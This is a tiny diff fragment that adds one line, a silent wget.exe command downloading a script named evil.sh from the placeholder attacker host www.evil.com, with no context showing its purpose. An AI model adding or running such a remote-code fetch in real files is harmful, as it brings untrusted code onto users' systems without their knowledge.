@@ -1,0 +1,1 @@
+wget.exe -q https://www.evil.com/evil.sh
